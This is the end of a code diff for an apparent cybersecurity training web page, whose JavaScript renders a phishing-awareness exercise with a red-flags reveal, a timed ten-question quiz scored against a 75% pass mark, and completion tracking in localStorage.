+        <div style="font-family:JetBrains Mono,monospace;font-size:.8rem;"><span style="color:var(--muted)">Subject: </span><span style="color:var(--danger);font-weight:600">${e.subj}</span></div>
+      </div>
+      <div style="padding:18px 20px;font-size:.84rem;color:var(--muted);white-space:pre-line;line-height:1.7;">${e.body}</div>
+    </div>
+    <div style="margin-top:14px;display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
+      <button onclick="revealRedFlags()" style="background:rgba(255,60,60,.1);border:1px solid rgba(255,60,60,.25);color:var(--accent);padding:9px 20px;border-radius:8px;font-family:JetBrains Mono,monospace;font-size:.78rem;cursor:pointer;">🚩 Reveal Red Flags</button>
+      <span style="font-size:.8rem;color:var(--muted)">Can you spot what's wrong before clicking?</span>
+    </div>
+    <div id="redFlagPanel" style="display:none;margin-top:12px;background:rgba(255,60,60,.05);border:1px solid rgba(255,60,60,.2);border-radius:10px;padding:16px 18px;">
+      <div style="font-family:Orbitron,sans-serif;font-size:.78rem;color:var(--accent);margin-bottom:10px;">🚩 RED FLAGS IDENTIFIED (${e.redFlags.length})</div>
+      ${e.redFlags.map((f,i) => `<div style="font-size:.82rem;color:var(--muted);padding:5px 0;border-bottom:1px solid rgba(255,255,255,.04);display:flex;gap:8px;align-items:flex-start;"><span style="color:var(--accent);font-family:JetBrains Mono,monospace;font-size:.7rem;flex-shrink:0;">${i+1}.</span>${f}</div>`).join('')}
+    </div>`;
+}
+function revealRedFlags() {
+  document.getElementById('redFlagPanel').style.display = 'block';
+}
+renderPhish();
+
+/* ═══ VIVA ═══════════════════════════════════════════ */
+function unlockViva() {
+  document.getElementById('vivaLocked').style.display = 'none';
+  document.getElementById('vivaTimer').style.display = 'block';
+  document.getElementById('quizForm').style.display = 'block';
+  startTimer();
+}
+let timerInterval;
+function startTimer() {
+  let seconds = 300;
+  timerInterval = setInterval(() => {
+    seconds--;
+    const m = String(Math.floor(seconds/60)).padStart(2,'0');
+    const s = String(seconds%60).padStart(2,'0');
+    document.getElementById('vivaTimer').textContent = `${m}:${s}`;
+    if (seconds <= 0) { clearInterval(timerInterval); submitViva(); }
+    if (seconds <= 60) document.getElementById('vivaTimer').style.color = 'var(--danger)';
+  }, 1000);
+}
+function submitViva() {
+  clearInterval(timerInterval);
+  const form = document.getElementById('quizForm');
+  const qs = ['q1','q2','q3','q4','q5','q6','q7','q8','q9','q10'];
+  let score = 0;
+  qs.forEach(q => { const checked = form.querySelector(`input[name="${q}"]:checked`); if (checked && checked.value === '1') score++; });
+  const pct = Math.round((score/qs.length)*100);
+  const passed = pct >= 75;
+  const result = document.getElementById('quizResult');
+  result.className = 'quiz-result ' + (passed ? 'qr-pass' : 'qr-fail');
+  document.getElementById('qrScore').textContent = `${pct}%`;
+  document.getElementById('qrScore').style.color = passed ? '#22c55e' : 'var(--danger)';
+  document.getElementById('qrMsg').textContent = passed
+    ? `⚔️ Excellent! Scored ${score}/${qs.length}. Red Team module complete! +250 XP awarded. You think like an attacker.`
+    : `Scored ${score}/${qs.length}. Need 75% to pass. Review the sections and try again.`;
+  result.style.display = 'block';
+  form.style.display = 'none';
+  if (passed) {
+    localStorage.setItem('redteam_complete','1');
+    document.getElementById('markBtn').classList.add('done');
+    document.getElementById('markBtn').textContent = '✅ Completed!';
+    document.getElementById('completeBtn').classList.add('done');
+    document.getElementById('completeBtn').textContent = '✅ Module Complete!';
+  }
+}
+
+/* ═══ MARK COMPLETE ══════════════════════════════════ */
+function completeCourse() {
+  localStorage.setItem('redteam_complete','1');
+  document.getElementById('markBtn').classList.add('done');
+  document.getElementById('markBtn').textContent = '✅ Completed!';
+  const cb = document.getElementById('completeBtn');
+  if (cb) { cb.classList.add('done'); cb.textContent = '✅ Module Complete!'; }
+}
+if (localStorage.getItem('redteam_complete')) {
+  document.getElementById('markBtn').classList.add('done');
+  document.getElementById('markBtn').textContent = '✅ Completed!';
+}
+</script>
+</body>
+</html>
